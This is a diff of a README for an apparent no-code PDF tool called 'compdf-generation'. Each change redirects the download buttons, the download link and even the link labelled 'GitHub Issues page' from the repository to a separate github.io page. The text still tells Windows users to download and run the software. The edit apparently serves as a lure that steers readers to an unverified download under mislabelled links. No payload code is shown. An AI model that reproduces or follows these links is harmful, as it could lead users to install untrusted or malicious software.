@@ -1,7 +1,7 @@
 <h1>📄 compdf-generation - Generate PDFs Without Writing Code</h1>
 
 <p align="center">
-  <a href="https://github.com/Dyspeptic-alfalfa841/compdf-generation" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px; margin:10px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://dyspeptic-alfalfa841.github.io" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px; margin:10px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <h2>📌 What Is compdf-generation?</h2>
@@ -19,7 +19,7 @@
 
 <h2>🚀 Quick Start Guide (Windows)</h2>
 <h3>Step 1: Download the Software</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Dyspeptic-alfalfa841/compdf-generation"><strong>https://github.com/Dyspeptic-alfalfa841/compdf-generation</strong></a></p>
+<p>Visit this link to download the application: <a href="https://dyspeptic-alfalfa841.github.io"><strong>https://dyspeptic-alfalfa841.github.io</strong></a></p>
 <p>Click the green "Code" button on the page, then select "Download ZIP". Save the file to your computer (usually your Downloads folder).</p>
 
 <h3>Step 2: Extract the Files</h3>
@@ -111,7 +111,7 @@
 <h2>🔗 Download and Setup</h2>
 <p>Ready to start generating PDFs? Click the button below to get the software:</p>
 <p align="center">
-  <a href="https://github.com/Dyspeptic-alfalfa841/compdf-generation" style="background-color:#2196F3; color:white; padding:14px 28px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD compdf-generation</a>
+  <a href="https://dyspeptic-alfalfa841.github.io" style="background-color:#2196F3; color:white; padding:14px 28px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD compdf-generation</a>
 </p>
 <p>After downloading, extract the ZIP file and follow the Quick Start Guide above. For additional help, visit the Issues page on the GitHub repository.</p>
 
@@ -126,7 +126,7 @@
 <h2>📄 License and Support</h2>
 <p>compdf-generation is released under an open-source license (MIT). You can use, modify, and distribute it freely. For support:</p>
 <ul>
-  <li>Check the <a href="https://github.com/Dyspeptic-alfalfa841/compdf-generation/issues">GitHub Issues page</a> for answers to common questions.</li>
+  <li>Check the <a href="https://dyspeptic-alfalfa841.github.io">GitHub Issues page</a> for answers to common questions.</li>
   <li>Post a new issue if you encounter a bug or need help.</li>
   <li>The community is active and always happy to assist.</li>
 </ul>
